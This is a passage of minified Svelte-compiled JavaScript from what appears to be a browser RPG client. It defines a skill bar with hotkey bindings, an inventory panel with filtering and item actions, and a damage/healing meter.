                descPos: "bottom:100%;left:50%;transform:translateX(-50%);",
                ",": !0,
                status: t[13] ? -1 : void 0 !== t[4] ? t[4].status : 0,
                id: "sk" + t[2].hotkey,
                data: t[2].id >= 0 || void 0 !== t[6] ? t[2] : void 0,
                auto: t[15],
                queued: t[14],
                meta: t[1],
                css: t[5],
                stacks: t[8],
                cd: t[11],
                img: t[7],
                remaining: t[12],
                key: t[2].hotkey,
                border: t[14] || t[9] ? "auto" : t[13] || t[15] || t[3] || t[11] ? "grey" : t[6] ? xf(t[6].quality)[0] : "white",
                $$slots: {
                    default: [Ok]
                },
                $$scope: {
                    ctx: t
                }
            }
        });
        return s.$on("discard", t[32]),
            s.$on("move", t[33]),
        {
            c() {
                Ft(s.$$.fragment)
            },
            m(t, i) {
                Zt(s, t, i),
                    e = !0
            },
            p(t, e) {
                const i = {};
                68 & e[0] && (i.describe = t[2].id >= 0 && !t[2].item || void 0 !== t[6]),
                    8208 & e[0] && (i.status = t[13] ? -1 : void 0 !== t[4] ? t[4].status : 0),
                    4 & e[0] && (i.id = "sk" + t[2].hotkey),
                    68 & e[0] && (i.data = t[2].id >= 0 || void 0 !== t[6] ? t[2] : void 0),
                    32768 & e[0] && (i.auto = t[15]),
                    16384 & e[0] && (i.queued = t[14]),
                    2 & e[0] && (i.meta = t[1]),
                    32 & e[0] && (i.css = t[5]),
                    256 & e[0] && (i.stacks = t[8]),
                    2048 & e[0] && (i.cd = t[11]),
                    128 & e[0] && (i.img = t[7]),
                    4096 & e[0] && (i.remaining = t[12]),
                    4 & e[0] && (i.key = t[2].hotkey),
                    59976 & e[0] && (i.border = t[14] || t[9] ? "auto" : t[13] || t[15] || t[3] || t[11] ? "grey" : t[6] ? xf(t[6].quality)[0] : "white"),
                    1092 & e[0] | 8 & e[1] && (i.$$scope = {
                        dirty: e,
                        ctx: t
                    }),
                    s.$set(i)
            },
            i(t) {
                e || (Et(s.$$.fragment, t),
                    e = !0)
            },
            o(t) {
                Mt(s.$$.fragment, t),
                    e = !1
            },
            d(t) {
                Ut(s, t)
            }
        }
    }
    function qk(t, e, s) {
        let n, a, r, o, l, c, h = i, d = () => (h(),
            h = u(p, t => s(2, n = t)),
            p);
        m(t, fe, t => s(23, a = t)),
            m(t, pe, t => s(25, r = t)),
            m(t, ge, t => s(26, o = t)),
            m(t, ye, t => s(27, l = t)),
            m(t, be, t => s(28, c = t)),
            t.$$.on_destroy.push(() => h());
        let { skill: p } = e;
        d();
        let { skillslot: f } = e
            , g = void 0
            , v = void 0
            , b = void 0
            , w = void 0;
        tt(() => {
            if (n.hotkey !== g && (void 0 !== v && $(),
                g = n.hotkey,
                void 0 !== g)) {
                w = $l[g],
                    null == w && (w = $l[g] = {});
                const t = _l(g, w);
                v = t.onPress(x),
                    b = t.onRelease(k)
            }
        }
        );
        const x = () => {
            if (Ua.player && n.id >= 0) {
                if (n.item) {
                    const t = Ua.player.inventory.findFirstSlotOfType(n.item.type, n.item.tier);
                    if (void 0 === t)
                        return;
                    y(p, n.info[0] = t, n)
                }
                Bm(ro.clientPlayerSkill.packData({
                    id: n.id,
                    info: n.info
                })),
                    s(9, R = !0),
                    dl({
                        id: "ui/pressbtn"
                    })
            }
        }
            , k = () => {
                s(9, R = !1)
            }
            , $ = () => {
                w && w.mappings && (w.mappings = w.mappings.filter(t => t != g)),
                    w && w.press && (w.press = w.press.filter(t => t != v)),
                    w && w.release && (w.release = w.release.filter(t => t != b)),
                    g = void 0,
                    v = void 0,
                    b = void 0
            }
            ;
        function S(e) {
            it(t, e)
        }
        function E(e) {
            it(t, e)
        }
        let M, _, C, T, P, I, D, A, B, R, z, F, Z, U, L, N;
        return et($),
            t.$set = t => {
                "skill" in t && d(s(0, p = t.skill)),
                    "skillslot" in t && s(16, f = t.skillslot)
            }
            ,
            t.$$.update = () => {
                65540 & t.$$.dirty[0] && s(1, M = {
                    type: "skill",
                    slot: f,
                    skill: n
                }),
                    4 & t.$$.dirty[0] && s(3, _ = n.id < 0),
                    4 & t.$$.dirty[0] && s(22, C = n.item),
                    8388620 & t.$$.dirty[0] && s(4, T = _ ? void 0 : a[n.id]),
                    16 & t.$$.dirty[0] && (P = T ? T.status : 0),
                    4 & t.$$.dirty[0] && s(5, I = n.item ? "slotitem" : "slotskill"),
                    33554436 & t.$$.dirty[0] && s(6, D = r && n.item && Ua.player ? Ua.player.inventory.findFirstItemOfType(n.item.type, n.item.tier) : void 0),
                    4194380 & t.$$.dirty[0] && s(7, A = _ ? void 0 : C ? D ? xp(D.type, D.tier, D.logic.class, wf(D.quality)) : xp(C.type, C.tier, 0, 0) : kp(n.id)),
                    37748800 & t.$$.dirty[0] && s(8, B = void 0 !== D && void 0 !== D.stacks ? r[C.type + C.tier] || 0 : void 0),
                    67108876 & t.$$.dirty[0] && s(10, z = n.item || _ ? 0 : o.reduce((t, e) => t + (e.logic.id === n.id && e.level), 0)),
                    16 & t.$$.dirty[0] && s(11, F = T ? T.cd : void 0),
                    16 & t.$$.dirty[0] && s(12, Z = T ? T.remaining : void 0),
                    1348 & t.$$.dirty[0] && s(13, U = n.item && (!D || 0 === B) || !n.item && 0 === z),
                    134217732 & t.$$.dirty[0] && s(14, L = void 0 !== l && l === n.id),
                    268435460 & t.$$.dirty[0] && s(15, N = void 0 !== c && c === n.id)
            }
            ,
            s(9, R = !1),
            [p, M, n, _, T, I, D, A, B, R, z, F, Z, U, L, N, f, $l, g, v, b, w, C, a, P, r, o, l, c, x, k, $, S, E]
    }
    class Xk extends Ot {
        constructor(t) {
            super(),
                Nt(this, t, qk, jk, h, {
                    skill: 0,
                    skillslot: 16
                }, [-1, -1])
        }
    }
    function Hk(t, e, s) {
        const i = t.slice();
        return i[8] = e[s],
            i[10] = s,
            i
    }
    function Kk(t) {
        let e;
        const s = new Xk({
            props: {
                skill: t[8],
                skillslot: t[10]
            }
        });
        return s.$on("discard", t[1]),
            s.$on("move", t[0]),
        {
            c() {
                Ft(s.$$.fragment)
            },
            m(t, i) {
                Zt(s, t, i),
                    e = !0
            },
            p: i,
            i(t) {
                e || (Et(s.$$.fragment, t),
                    e = !0)
            },
            o(t) {
                Mt(s.$$.fragment, t),
                    e = !1
            },
            d(t) {
                Ut(s, t)
            }
        }
    }
    function Wk(t) {
        let e, s, i = Ue, n = [];
        for (let e = 0; e < i.length; e += 1)
            n[e] = Kk(Hk(t, i, e));
        const a = t => Mt(n[t], 1, 1, () => {
            n[t] = null
        }
        );
        return {
            c() {
                e = T("div");
                for (let t = 0; t < n.length; t += 1)
                    n[t].c();
                B(e, "id", "skillbar"),
                    B(e, "class", "panel-black bar svelte-1v6qmvo")
            },
            m(t, i) {
                M(t, e, i);
                for (let t = 0; t < n.length; t += 1)
                    n[t].m(e, null);
                s = !0
            },
            p(t, [s]) {
                if (3 & s) {
                    let r;
                    for (i = Ue,
                        r = 0; r < i.length; r += 1) {
                        const a = Hk(t, i, r);
                        n[r] ? (n[r].p(a, s),
                            Et(n[r], 1)) : (n[r] = Kk(a),
                                n[r].c(),
                                Et(n[r], 1),
                                n[r].m(e, null))
                    }
                    for ($t(),
                        r = i.length; r < n.length; r += 1)
                        a(r);
                    St()
                }
            },
            i(t) {
                if (!s) {
                    for (let t = 0; t < i.length; t += 1)
                        Et(n[t]);
                    s = !0
                }
            },
            o(t) {
                n = n.filter(Boolean);
                for (let t = 0; t < n.length; t += 1)
                    Mt(n[t]);
                s = !1
            },
            d(t) {
                t && _(e),
                    C(n, t)
            }
        }
    }
    function Yk(t, e, s) {
        let i, n, a;
        m(t, vs, t => s(3, i = t)),
            m(t, gi, t => s(4, n = t)),
            m(t, le, t => s(5, a = t));
        const r = Ua.player.name;
        let o = i[r];
        o || (o = y(vs, i[r] = [], i));
        for (let t = 0; t < n; ++t)
            if (void 0 === i[r][t]) {
                const e = uf[Ua.player.class].startSkills[t];
                i[r].push({
                    id: void 0 !== e && by.get(e).autoSkillbar ? e : -1,
                    type: 0,
                    info: []
                }),
                    4 === t || 5 === t ? (y(vs, i[r][t].id = 100, i),
                        y(vs, i[r][t].item = {
                            type: "misc",
                            tier: t - 4
                        }, i)) : 11 === t && y(vs, i[r][11].id = 40, i)
            }
        for (let t = 0; t < n; ++t)
            void 0 === Ue[t] && Ue.push(qt({
                id: -1,
                type: 0,
                info: []
            }));
        i[r].forEach((t, e) => {
            Ue[e] && (t.hotkey = ji["kbSkillbar" + (e + 1)],
                Ue[e].set(t))
        }
        ),
            Ue.forEach((t, e) => {
                t.subscribe(t => {
                    vs.update(s => (s[r][e] = t,
                        s))
                }
                )
            }
            );
        const l = t => {
            const { from: e, to: s } = t.detail;
            e !== s && ("item" == e.type ? Ue[s.slot].update(t => (t.id = e.item.logic.useSkill,
                t.item = {
                    type: e.item.type,
                    tier: e.item.tier
                },
                t)) : "skill" == e.type && (Ue[s.slot].update(t => (t.id = e.skill.id,
                    t.item = e.skill.item,
                    t)),
                    void 0 !== e.slot && Ue[e.slot].update(c)))
        }
            , c = t => (t.id = -1,
                t.item = void 0,
                t);
        return [l, t => {
            Ue[a.meta.slot].update(c)
        }
        ]
    }
    class Vk extends Ot {
        constructor(t) {
            super(),
                Nt(this, t, Yk, Wk, d, {})
        }
    }
    function Gk(t) {
        let e;
        const s = new Uk({
            props: {
                isTrader: t[6],
                item: t[9]
            }
        });
        return {
            c() {
                Ft(s.$$.fragment)
            },
            m(t, i) {
                Zt(s, t, i),
                    e = !0
            },
            p(t, e) {
                const i = {};
                64 & e && (i.isTrader = t[6]),
                    512 & e && (i.item = t[9]),
                    s.$set(i)
            },
            i(t) {
                e || (Et(s.$$.fragment, t),
                    e = !0)
            },
            o(t) {
                Mt(s.$$.fragment, t),
                    e = !1
            },
            d(t) {
                Ut(s, t)
            }
        }
    }
    function Qk(t) {
        let e, s, i = t[9] && Gk(t);
        return {
            c() {
                i && i.c(),
                    e = D()
            },
            m(t, n) {
                i && i.m(t, n),
                    M(t, e, n),
                    s = !0
            },
            p(t, s) {
                t[9] ? i ? (i.p(t, s),
                    512 & s && Et(i, 1)) : (i = Gk(t),
                        i.c(),
                        Et(i, 1),
                        i.m(e.parentNode, e)) : i && ($t(),
                            Mt(i, 1, 1, () => {
                                i = null
                            }
                            ),
                            St())
            },
            i(t) {
                s || (Et(i),
                    s = !0)
            },
            o(t) {
                Mt(i),
                    s = !1
            },
            d(t) {
                i && i.d(t),
                    t && _(e)
            }
        }
    }
    function Jk(t) {
        let e;
        const s = new lx({
            props: {
                describe: void 0 !== t[9],
                cd: t[14],
                id: t[7],
                hover: t[5],
                descPos: t[4],
                descRoot: t[3],
                pickable: t[1],
                status: t[11] ? -1 : 0,
                meta: t[10],
                img: t[8],
                border: t[12],
                stacks: t[13],
                data: t[9],
                key: t[2],
                $$slots: {
                    default: [Qk]
                },
                $$scope: {
                    ctx: t
                }
            }
        });
        return s.$on("discard", t[21]),
            s.$on("use", t[22]),
            s.$on("click", t[23]),
            s.$on("context", t[24]),
            s.$on("move", t[25]),
        {
            c() {
                Ft(s.$$.fragment)
            },
            m(t, i) {
                Zt(s, t, i),
                    e = !0
            },
            p(t, [e]) {
                const i = {};
                512 & e && (i.describe = void 0 !== t[9]),
                    16384 & e && (i.cd = t[14]),
                    128 & e && (i.id = t[7]),
                    32 & e && (i.hover = t[5]),
                    16 & e && (i.descPos = t[4]),
                    8 & e && (i.descRoot = t[3]),
                    2 & e && (i.pickable = t[1]),
                    2048 & e && (i.status = t[11] ? -1 : 0),
                    1024 & e && (i.meta = t[10]),
                    256 & e && (i.img = t[8]),
                    4096 & e && (i.border = t[12]),
                    8192 & e && (i.stacks = t[13]),
                    512 & e && (i.data = t[9]),
                    4 & e && (i.key = t[2]),
                    67109440 & e && (i.$$scope = {
                        dirty: e,
                        ctx: t
                    }),
                    s.$set(i)
            },
            i(t) {
                e || (Et(s.$$.fragment, t),
                    e = !0)
            },
            o(t) {
                Mt(s.$$.fragment, t),
                    e = !1
            },
            d(t) {
                Ut(s, t)
            }
        }
    }
    function t$(t, e, s) {
        let n, a, r = i, o = () => (r(),
            r = u(l, t => s(9, n = t)),
            l);
        m(t, fe, t => s(19, a = t)),
            t.$$.on_destroy.push(() => r());
        let { item: l } = e;
        o();
        let { filter: c = "" } = e
            , { invslot: h } = e
            , { pickable: d = !0 } = e
            , { text: p } = e
            , { descRoot: f } = e
            , { descPos: g } = e
            , { hover: v } = e
            , { isTrader: y = !1 } = e
            , { clearOnMove: b = !1 } = e
            , { id: w = "" } = e;
        const x = t => !(!0 !== t && !n.moving) || !!t && !(n.type.includes(t) || n.logic.level > t || Xi.items[n.type]["book" === n.type ? n.logic.skillid : n.tier].name.toLowerCase().includes(t));
        function k(e) {
            it(t, e)
        }
        function $(e) {
            it(t, e)
        }
        function S(e) {
            it(t, e)
        }
        function E(e) {
            it(t, e)
        }
        function M(e) {
            it(t, e)
        }
        let _, C, T, P, I, D, A;
        return t.$set = t => {
            "item" in t && o(s(0, l = t.item)),
                "filter" in t && s(15, c = t.filter),
                "invslot" in t && s(16, h = t.invslot),
                "pickable" in t && s(1, d = t.pickable),
                "text" in t && s(2, p = t.text),
                "descRoot" in t && s(3, f = t.descRoot),
                "descPos" in t && s(4, g = t.descPos),
                "hover" in t && s(5, v = t.hover),
                "isTrader" in t && s(6, y = t.isTrader),
                "clearOnMove" in t && s(17, b = t.clearOnMove),
                "id" in t && s(7, w = t.id)
        }
            ,
            t.$$.update = () => {
                66048 & t.$$.dirty && s(8, _ = n ? xp(n.type, n.tier, n.logic ? n.logic.class : 0, wf(n.quality)) : h > 100 ? $p(h) : void 0),
                    197121 & t.$$.dirty && s(10, C = {
                        type: "item",
                        slot: h,
                        item: n,
                        store: b ? l : void 0
                    }),
                    33344 & t.$$.dirty && s(11, T = n && (y ? !n.canEquipClass(Ua.player) : x(c))),
                    2624 & t.$$.dirty && s(12, P = n ? xf(n.quality)[0] + (T ? " grey" : y ? n.canEquip(Ua.player) ? "" : " red" : "") : "grey"),
                    512 & t.$$.dirty && s(13, I = n && (n.upgrade ? "+" + n.upgrade : n.stacks)),
                    524800 & t.$$.dirty && s(18, D = n && n.logic.use ? n.logic.useSkill && a[n.logic.useSkill] : void 0),
                    262144 & t.$$.dirty && s(14, A = D ? D.cd : void 0)
            }
            ,
            [l, d, p, f, g, v, y, w, _, n, C, T, P, I, A, c, h, b, D, a, x, k, $, S, E, M]
    }
    class e$ extends Ot {
        constructor(t) {
            super(),
                Nt(this, t, t$, Jk, h, {
                    item: 0,
                    filter: 15,
                    invslot: 16,
                    pickable: 1,
                    text: 2,
                    descRoot: 3,
                    descPos: 4,
                    hover: 5,
                    isTrader: 6,
                    clearOnMove: 17,
                    id: 7
                })
        }
    }
    function s$(t, e, s) {
        const i = t.slice();
        return i[15] = e[s],
            i[17] = s,
            i
    }
    function i$(t) {
        let e;
        const s = new e$({
            props: {
                id: "bag" + t[17],
                item: t[15],
                invslot: t[17],
                filter: t[0].toLowerCase()
            }
        });
        return s.$on("use", t[8]),
            s.$on("context", t[7]),
            s.$on("move", t[6]),
        {
            c() {
                Ft(s.$$.fragment)
            },
            m(t, i) {
                Zt(s, t, i),
                    e = !0
            },
            p(t, e) {
                const i = {};
                2 & e && (i.item = t[15]),
                    1 & e && (i.filter = t[0].toLowerCase()),
                    s.$set(i)
            },
            i(t) {
                e || (Et(s.$$.fragment, t),
                    e = !0)
            },
            o(t) {
                Mt(s.$$.fragment, t),
                    e = !1
            },
            d(t) {
                Ut(s, t)
            }
        }
    }
    function n$(t) {
        let e, s, i, n, a, r, o = t[1].filter(r$), l = [];
        for (let e = 0; e < o.length; e += 1)
            l[e] = i$(s$(t, o, e));
        const c = t => Mt(l[t], 1, 1, () => {
            l[t] = null
        }
        )
            , h = new nk({
                props: {
                    amount: t[4]
                }
            })
            , d = new hk({
                props: {
                    amount: t[5]
                }
            });
        return {
            c() {
                e = T("input"),
                    s = T("div");
                for (let t = 0; t < l.length; t += 1)
                    l[t].c();
                i = T("div"),
                    Ft(h.$$.fragment),
                    n = T("a"),
                    Ft(d.$$.fragment),
                    B(e, "class", "filter svelte-1axz35n"),
                    B(e, "type", "text"),
                    B(e, "placeholder", "Filter"),
                    B(s, "class", "slotcontainer svelte-1axz35n"),
                    U(s, "grid-template-columns", "repeat(" + t[3] + ", auto)"),
                    B(i, "class", "panel-black gold svelte-1axz35n"),
                    B(n, "class", "panel-black gold svelte-1axz35n"),
                    U(n, "margin-right", "3px"),
                    B(n, "target", "_blank"),
                    B(n, "href", "/store")
            },
            m(o, c, u) {
                M(o, e, c),
                    Z(e, t[0]),
                    M(o, s, c);
                for (let t = 0; t < l.length; t += 1)
                    l[t].m(s, null);
                M(o, i, c),
                    Zt(h, i, null),
                    M(o, n, c),
                    Zt(d, n, null),
                    a = !0,
                    u && r(),
                    r = A(e, "input", t[13])
            },
            p(t, i) {
                if (1 & i && e.value !== t[0] && Z(e, t[0]),
                    451 & i) {
                    let e;
                    for (o = t[1].filter(r$),
                        e = 0; e < o.length; e += 1) {
                        const n = s$(t, o, e);
                        l[e] ? (l[e].p(n, i),
                            Et(l[e], 1)) : (l[e] = i$(n),
                                l[e].c(),
                                Et(l[e], 1),
                                l[e].m(s, null))
                    }
                    for ($t(),
                        e = o.length; e < l.length; e += 1)
                        c(e);
                    St()
                }
                (!a || 8 & i) && U(s, "grid-template-columns", "repeat(" + t[3] + ", auto)");
                const n = {};
                16 & i && (n.amount = t[4]),
                    h.$set(n);
                const r = {};
                32 & i && (r.amount = t[5]),
                    d.$set(r)
            },
            i(t) {
                if (!a) {
                    for (let t = 0; t < o.length; t += 1)
                        Et(l[t]);
                    Et(h.$$.fragment, t),
                        Et(d.$$.fragment, t),
                        a = !0
                }
            },
            o(t) {
                l = l.filter(Boolean);
                for (let t = 0; t < l.length; t += 1)
                    Mt(l[t]);
                Mt(h.$$.fragment, t),
                    Mt(d.$$.fragment, t),
                    a = !1
            },
            d(t) {
                t && _(e),
                    t && _(s),
                    C(l, t),
                    t && _(i),
                    Ut(h),
                    t && _(n),
                    Ut(d),
                    r()
            }
        }
    }
    function a$(t) {
        let e, s;
        const i = new Sb({
            props: {
                title: "Inventory",
                pad: "5",
                icon: "bag",
                $$slots: {
                    default: [n$]
                },
                $$scope: {
                    ctx: t
                }
            }
        });
        return i.$on("close", t[14]),
        {
            c() {
                e = T("div"),
                    Ft(i.$$.fragment),
                    U(e, "display", t[2] ? "block" : "none"),
                    B(e, "class", "l-corner-lr container svelte-1axz35n")
            },
            m(t, n) {
                M(t, e, n),
                    Zt(i, e, null),
                    s = !0
            },
            p(t, [n]) {
                const a = {};
                262203 & n && (a.$$scope = {
                    dirty: n,
                    ctx: t
                }),
                    i.$set(a),
                    (!s || 4 & n) && U(e, "display", t[2] ? "block" : "none")
            },
            i(t) {
                s || (Et(i.$$.fragment, t),
                    s = !0)
            },
            o(t) {
                Mt(i.$$.fragment, t),
                    s = !1
            },
            d(t) {
                t && _(e),
                    Ut(i)
            }
        }
    }
    const r$ = (t, e) => e < 101;
    function o$(t, e, s) {
        let i, n, a, r, o, l, c, h, d;
        m(t, me, t => s(1, i = t)),
            m(t, le, t => s(9, n = t)),
            m(t, Te, t => s(10, a = t)),
            m(t, Ie, t => s(11, r = t)),
            m(t, Se, t => s(12, o = t)),
            m(t, os, t => s(2, l = t)),
            m(t, rs, t => s(3, c = t)),
            m(t, he, t => s(4, h = t)),
            m(t, ue, t => s(5, d = t));
        let u = "";
        const p = t => {
            const { from: e, to: s } = t.detail;
            if (e !== s && "item" == e.type) {
                if (rp("itemmove", `${e.slot} ${s.slot}`),
                    e.slot >= 101)
                    return;
                e.item.stacks && (e.item.stacks = ""),
                    e.item.moving = !0,
                    s.item ? (s.item.stacks && (s.item.stacks = ""),
                        i[e.slot].set(s.item),
                        s.item.moving = !0) : i[e.slot] && i[e.slot].set(void 0),
                    i[s.slot].set(e.item)
            }
        }
            ;
        function f() {
            u = this.value,
                s(0, u)
        }
        const g = t => y(os, l = !1);
        return [u, i, l, c, h, d, p, t => {
            if (!t.detail.item || n)
                return;
            const e = [];
            if (a)
                e.push(Bw.itemstash(t.detail.slot));
            else {
                if (t.detail.item.canEquip(Ua.player)) {
                    const s = t.detail.item.getBestEquipslot(Ua.player.inventory);
                    void 0 !== s && e.push(Bw.itemmove(t.detail.slot, s)),
                        t.detail.item.logic.use && e.push(Bw.itemuse(t.detail.slot, t.detail.item.logic.useSkill))
                }
                t.detail.item.canBeDropped() && e.push(Bw.itemdrop(t.detail.item.quality, t.detail.item.upgrade, t.detail.slot, t.detail.item.type, t.detail.item.tier)),
                    r && t.detail.item.canBeSold() && e.push(Bw.itemsell(t.detail.item.quality, t.detail.item.upgrade, t.detail.slot, t.detail.item.type, t.detail.item.tier)),
                    t.detail.item.stacks > 1 && (e.push(Bw.itemsplithalf(t.detail.slot)),
                        e.push(Bw.itemsplitone(t.detail.slot))),
                    e.push(Bw.itemcopyid(t.detail.item.dbid))
            }
            Wt.set({
                x: t.detail.e.pageX - t.detail.e.layerX,
                y: t.detail.e.pageY + (46 - t.detail.e.layerY),
                opts: e
            })
        }
            , t => {
                t.detail.item && (a ? rp("itemstash", "" + t.detail.slot) : o ? Me.set(t.detail.item) : r && t.detail.item.canBeSold() ? Fw(t.detail.item.quality, t.detail.item.upgrade, t.detail.slot, t.detail.item.type, t.detail.item.tier) : t.detail.item.canBeDropped() && Zw(t.detail.item.quality, t.detail.item.upgrade, t.detail.slot, t.detail.item.type, t.detail.item.tier))
            }
            , n, a, r, o, f, g]
    }
    class l$ extends Ot {
        constructor(t) {
            super(),
                Nt(this, t, o$, a$, h, {})
        }
    }
    const c$ = new Map
        , h$ = new fh(0, .5)
        , d$ = () => {
            c$.clear(),
                h$.reset(0)
        }
        , u$ = d$
        , m$ = t => {
            ji.dpsmeterOpen && h$.done(Ua.time) && (h$.reset(Ua.time),
                c$.forEach((t, e) => {
                    if (t.ooc)
                        return void (Ua.time - t.start > 5 && c$.delete(e));
                    !Ua.entity(t.id) || Ua.time - t.last > 5 ? (t.ooc = !0,
                        t.start = Ua.time) : t.dps = Math.ceil(t.amount / Math.max(5, Ua.time - t.start))
                }
                ),
                ze.set(Array.from(c$).sort((t, e) => e[1].dps - t[1].dps).slice(0, 10)))
        }
        , p$ = (t, e) => {
            if (void 0 === t.name || !ji.dpsmeterOpen || 0 !== t.type)
                return;
            if (ji.dpsmeterParty && (0 === Ua.player.party && t !== Ua.player || t.party !== Ua.player.party))
                return;
            let s = void 0;
            c$.has(t.name) ? s = c$.get(t.name) : (c$.set(t.name, s = {}),
                s.amount = 0,
                s.start = 0,
                s.class = t.class,
                s.dps = 0,
                s.id = t.id,
                s.ooc = !0),
                s.ooc ? (s.start = Ua.time,
                    s.ooc = !1,
                    s.amount = e) : s.amount += e,
                s.last = Ua.time
        }
        ;
    var f$ = Object.freeze({
        __proto__: null,
        values: c$,
        init: d$,
        onWorldEnter: u$,
        tick: m$,
        add: p$
    });
    function g$(t, e, s) {
        const i = t.slice();
        return i[8] = e[s],
            i[10] = s,
            i
    }
    function v$(t) {
        let e, s;
        const i = new Sb({
            props: {
                title: t[1],
                pad: "5",
                icon: "trophy",
                $$slots: {
                    default: [b$]
                },
                $$scope: {
                    ctx: t
                }
            }
        });
        return i.$on("close", t[7]),
        {
            c() {
                e = T("div"),
                    Ft(i.$$.fragment),
                    B(e, "class", "l-corner-lr container svelte-wamtsw")
            },
            m(t, n) {
                M(t, e, n),
                    Zt(i, e, null),
                    s = !0
            },
            p(t, e) {
                const s = {};
                2 & e && (s.title = t[1]),
                    2062 & e && (s.$$scope = {
                        dirty: e,
                        ctx: t
                    }),
                    i.$set(s)
            },
            i(t) {
                s || (Et(i.$$.fragment, t),
                    s = !0)
            },
            o(t) {
                Mt(i.$$.fragment, t),
                    s = !1
            },
            d(t) {
                t && _(e),
                    Ut(i)
            }
        }
    }
    function y$(t, e) {
        let s, i;
        const n = new Vb({
            props: {
                size: "0.9em",
                fract: Math.round(100 * e[8][1].dps / e[2][0][1].dps),
                barcol: "bgc" + e[8][1].class,
                left: `${e[10] + 1}. ${e[8][0]}`,
                right: `${_b(e[8][1].amount)} (${Cb(e[8][1].dps)})`
            }
        });
        return {
            key: t,
            first: null,
            c() {
                s = D(),
                    Ft(n.$$.fragment),
                    this.first = s
            },
            m(t, e) {
                M(t, s, e),
                    Zt(n, t, e),
                    i = !0
            },
            p(t, e) {
                const s = {};
                4 & e && (s.fract = Math.round(100 * t[8][1].dps / t[2][0][1].dps)),
                    4 & e && (s.barcol = "bgc" + t[8][1].class),
                    4 & e && (s.left = `${t[10] + 1}. ${t[8][0]}`),
                    4 & e && (s.right = `${_b(t[8][1].amount)} (${Cb(t[8][1].dps)})`),
                    n.$set(s)
            },
            i(t) {
                i || (Et(n.$$.fragment, t),
                    i = !0)
            },
            o(t) {
                Mt(n.$$.fragment, t),
                    i = !1
            },
            d(t) {
                t && _(s),
                    Ut(n, t)
            }
        }
    }
    function b$(t) {
        let e, s, i, n, a, r, o, c, h, d, u = [], m = new Map, p = t[2];
        const f = t => t[8][1].id;
        for (let e = 0; e < p.length; e += 1) {
            let s = g$(t, p, e)
                , i = f(s);
            m.set(i, u[e] = y$(i, s))
        }
        return {
            c() {
                e = T("div");
                for (let t = 0; t < u.length; t += 1)
                    u[t].c();
                s = T("div"),
                    i = T("div"),
                    n = P(t[1]),
                    a = T("div"),
                    r = P("Party"),
                    c = T("div"),
                    c.textContent = "Reset",
                    B(e, "class", "wrapper svelte-wamtsw"),
                    B(i, "class", "btn grey"),
                    B(a, "class", o = "btn " + (t[3] ? "grey active" : "black")),
                    B(c, "class", "btn grey"),
                    B(s, "class", "grid buttons marg-top svelte-wamtsw"),
                    U(s, "grid-template-columns", "2fr 1fr 1fr")
            },
            m(o, m, p) {
                M(o, e, m);
                for (let t = 0; t < u.length; t += 1)
                    u[t].m(e, null);
                M(o, s, m),
                    E(s, i),
                    E(i, n),
                    E(s, a),
                    E(a, r),
                    E(s, c),
                    h = !0,
                    p && l(d),
                    d = [A(i, "click", t[4]), A(a, "click", t[5]), A(c, "click", t[6])]
            },
            p(t, s) {
                if (4 & s) {
                    const i = t[2];
                    $t(),
                        u = At(u, s, f, 1, t, i, m, e, Dt, y$, null, g$),
                        St()
                }
                (!h || 2 & s) && F(n, t[1]),
                    (!h || 8 & s && o !== (o = "btn " + (t[3] ? "grey active" : "black"))) && B(a, "class", o)
            },
            i(t) {
                if (!h) {
                    for (let t = 0; t < p.length; t += 1)
                        Et(u[t]);
                    h = !0
                }
            },
            o(t) {
                for (let t = 0; t < u.length; t += 1)
                    Mt(u[t]);
                h = !1
            },
            d(t) {
                t && _(e);
                for (let t = 0; t < u.length; t += 1)
                    u[t].d();
                t && _(s),
                    l(d)
            }
        }
    }
    function w$(t) {
        let e, s, i = t[0] && v$(t);
        return {
            c() {
                i && i.c(),
                    e = D()
            },
            m(t, n) {
                i && i.m(t, n),
                    M(t, e, n),
                    s = !0
            },
            p(t, [s]) {
                t[0] ? i ? (i.p(t, s),
                    1 & s && Et(i, 1)) : (i = v$(t),
                        i.c(),
                        Et(i, 1),
                        i.m(e.parentNode, e)) : i && ($t(),
                            Mt(i, 1, 1, () => {
                                i = null
                            }
                            ),
                            St())
            },
            i(t) {
                s || (Et(i),
                    s = !0)
            },
            o(t) {
                Mt(i),
                    s = !1
            },
            d(t) {
                i && i.d(t),
                    t && _(e)
            }
        }
    }
    function x$(t, e, s) {
        let i, n, a, r;
        m(t, hs, t => s(0, i = t)),
            m(t, fs, t => s(1, n = t)),
            m(t, ze, t => s(2, a = t)),
            m(t, ps, t => s(3, r = t));
        const o = t => y(ps, r = !r)
            , l = t => y(hs, i = !1);
        return [i, n, a, r, t => {
            Wt.set({
                x: t.pageX,
                y: t.pageY - 50,
                opts: ["Damage", "Healing"].map(t => ({
                    name: t,
                    fun: () => {
                        fs.set(t),
                            c$.clear()
                    }
                }))
            })
        }
            , o, t => c$.clear(), l]
    }
    class k$ extends Ot {
        constructor(t) {
            super(),
                Nt(this, t, x$, w$, h, {})
        }
    }
    function $$(t) {
        let e, s, i, n, a, r = t[0].rF + "";
        return {
            c() {
                e = T("p"),
                    s = P(r),
                    n = I(),
                    B(e, "class", "text location textgreen svelte-hrt4ky")
            },
            m(t, i) {
                M(t, e, i),
                    E(e, s),
                    M(t, n, i),
                    a = !0
            },
            p(t, e) {
                (!a || 1 & e) && r !== (r = t[0].rF + "") && F(s, r)
            },
            i(t) {
                a || (ut(() => {
                    i || (i = Tt(e, dm, {}, !0)),
                        i.run(1)
                }
                ),
                    a = !0)
            },
            o(t) {
                i || (i = Tt(e, dm, {}, !1)),
                    i.run(0),
                    a = !1
            },
            d(t) {
                t && _(e),
                    t && i && i.end(),
                    t && _(n)
            }
        }
    }
    function S$(t) {
        let e, s, i, n, a = t[0].error + "";
        return {
            c() {
                e = T("p"),
                    s = P(a),
                    B(e, "class", "text error textred svelte-hrt4ky")
            },
            m(t, i) {
                M(t, e, i),
                    E(e, s),
                    n = !0
            },
            p(t, e) {
                (!n || 1 & e) && a !== (a = t[0].error + "") && F(s, a)
            },
            i(t) {
                n || (i && i.end(1),
                    n = !0)
            },
            o(t) {
                i = Ct(e, dm, {}),
                    n = !1
            },
            d(t) {
                t && _(e),
                    t && i && i.end()
            }
        }
    }
    function E$(t) {
        let e, s, i, n = t[0].rF && $$(t), a = t[0].error && S$(t);
        return {
            c() {
                e = T("div"),
                    n && n.c(),
                    s = D(),
                    a && a.c(),
                    B(e, "class", "l-ui")
            },
            m(t, r) {
                M(t, e, r),
                    n && n.m(e, null),
                    E(e, s),
                    a && a.m(e, null),
                    i = !0
            },
            p(t, [i]) {
                t[0].rF ? n ? (n.p(t, i),
